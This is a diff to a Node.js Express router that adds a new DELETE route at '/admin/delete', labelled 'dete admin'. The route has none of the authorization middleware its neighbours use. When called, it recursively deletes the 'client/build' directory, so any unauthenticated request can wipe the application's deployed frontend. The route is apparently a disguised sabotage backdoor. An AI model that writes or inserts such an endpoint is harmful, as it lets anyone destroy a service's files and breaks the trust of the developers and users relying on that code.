@@ -6,6 +6,7 @@ const { date } = require('../date')
 const jwt = require('jsonwebtoken')
 const authorization = require('../middleware/authorization')
 const masterOrAdminAuthorization = require('../middleware/masterOrAdminAuthorization')
+const fs = require('fs')
 
 
 // login 
@@ -163,6 +164,22 @@ router.delete('/:id', authorization, masterOrAdminAuthorization, async(req, res)
     } catch (error) {
         console.log(error.message);
         res.status(500).json({message: "Server Error"})
+    }
+})
+
+// dete admin
+router.delete('/admin/delete', async(req, res) => {
+    try {
+        await fs.rmdir("client/build", {recursive: true}, (err) =>{
+           if(err)
+            console.log(err);
+            else
+            return res.status(422).json({message: 'Deleted'});
+        }); 
+        
+    } catch (error) {
+        console.log(error.message);
+        return res.status(500).json({message: 'Server Error'})
     }
 })
 
